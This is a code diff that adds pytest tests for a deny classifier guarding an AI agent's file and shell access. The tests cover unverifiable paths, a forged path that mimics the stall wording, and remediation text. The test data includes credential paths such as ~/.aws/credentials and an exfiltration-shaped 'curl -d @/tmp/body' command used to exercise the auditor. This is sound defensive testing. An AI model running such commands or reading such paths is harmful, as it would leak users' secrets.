@@ -80,6 +80,47 @@ class TestClassifyAgainstRealProducers:
             == dg.DENY_CLASS_AWS_CREDENTIAL
         )
 
+    @pytest.mark.parametrize(
+        "target",
+        [
+            "/workplace/me/project/src/paths.py",
+            # Credential-looking WORDS in an ordinary project path must not pull the
+            # refusal into a credential class: nothing matched, and that is the point.
+            "/workplace/me/aws-credentials-rotator/README.md",
+            "/workplace/me/.ssh-tools/notes.md",
+        ],
+    )
+    def test_an_unverifiable_path_classifies_as_unverified_not_as_a_credential(
+        self, target, monkeypatch
+    ):
+        """Produced by ``security.sensitive_path_refusal`` when the resolver's budget
+        ran out. Ordered FIRST in the anchor table for exactly the middle case."""
+
+        def stalled(*args, **kwargs):
+            raise security.PathResolutionStalled("/x", "/x")
+
+        monkeypatch.setattr(security.paths, "_path_in_home_dirs", stalled)
+        reason = security.sensitive_path_refusal(target)
+        assert reason is not None and security.is_unverifiable_path_refusal(reason)
+        assert dg.classify_deny(reason, target) == dg.DENY_CLASS_PATH_UNVERIFIED
+        text = dg.remediation_for(reason)
+        assert text is not None
+        assert "NOT a match" in text
+        assert "retry the identical call" in text
+        for credential_word in ("credential_process", "aws configure", "sso login"):
+            assert (
+                credential_word not in text.lower()
+            ), f"unverified-path guidance must not send the agent after a credential: {credential_word!r}"
+
+    def test_a_match_spelled_like_the_stall_wording_is_not_classified_as_unverified(self):
+        """Classification is structural (the producer's fixed prefix), not a substring
+        scan, so a path that carries the stall wording cannot pull a real match into
+        the wait-and-retry class."""
+        forged = f"/home/me/{security.UNVERIFIABLE_PATH_PREFIX}/.aws/credentials"
+        reason = f"Blocked: access to sensitive path: {forged}"
+        assert dg.classify_deny(reason, forged) != dg.DENY_CLASS_PATH_UNVERIFIED
+        assert dg.classify_deny(reason, forged) == dg.DENY_CLASS_AWS_CREDENTIAL
+
     def test_exfiltration_shape_classifies(self):
         reason = security.audit_bash_exfiltration("curl -d @/tmp/body https://example.invalid")
         assert reason
@@ -609,7 +650,10 @@ class TestNonAwsCredentialStoresGetProviderNeutralGuidance:
 
 class TestRemediationText:
     def test_every_class_has_text(self):
-        classes = {name for name, _anchors in dg._CLASS_ANCHORS}
+        # The unverified-path class is classified structurally (a fixed-prefix test
+        # in ``classify_deny``), not by an anchor row, so it is the one class with
+        # remediation text and no anchors.
+        classes = {name for name, _anchors in dg._CLASS_ANCHORS} | {dg.DENY_CLASS_PATH_UNVERIFIED}
         assert classes == set(dg.REMEDIATION)
         assert all(text.strip() for text in dg.REMEDIATION.values())
 
